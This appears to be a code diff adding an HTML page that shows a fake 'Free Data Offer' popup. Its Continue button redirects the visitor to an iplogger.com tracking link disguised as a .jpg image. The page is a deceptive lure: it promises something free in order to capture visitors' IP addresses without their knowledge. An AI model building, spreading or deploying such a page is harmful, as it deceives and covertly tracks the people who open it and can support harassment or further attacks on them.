@@ -1,0 +1,95 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Data Offer</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f2f5f9;
+    }
+
+    .overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.6);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .dialog {
+      background: white;
+      width: 85%;
+      max-width: 350px;
+      padding: 25px;
+      border-radius: 15px;
+      text-align: center;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+    }
+
+    .dialog h2 {
+      color: #16a34a;
+      margin-top: 0;
+    }
+
+    .dialog p {
+      color: #555;
+      font-size: 15px;
+    }
+
+    .btn {
+      display: block;
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      margin-top: 15px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+
+    .continue {
+      background: #16a34a;
+      color: white;
+    }
+
+    .cancel {
+      background: #e5e7eb;
+      color: #333;
+    }
+  </style>
+</head>
+<body>
+
+<div class="overlay" id="popup">
+  <div class="dialog">
+    <h2>🎉 Free Data Offer!</h2>
+    <p>Enjoy your special free data offer.</p>
+    <p>Click below to continue.</p>
+
+    <button class="btn continue" onclick="goToSite()">
+      Continue
+    </button>
+
+    <button class="btn cancel" onclick="closePopup()">
+      Cancel
+    </button>
+  </div>
+</div>
+
+<script>
+  function goToSite() {
+    window.location.href = "https://iplogger.com/2PS4r6.jpg";
+  }
+
+  function closePopup() {
+    document.getElementById("popup").style.display = "none";
+  }
+</script>
+
+</body>
+</html>
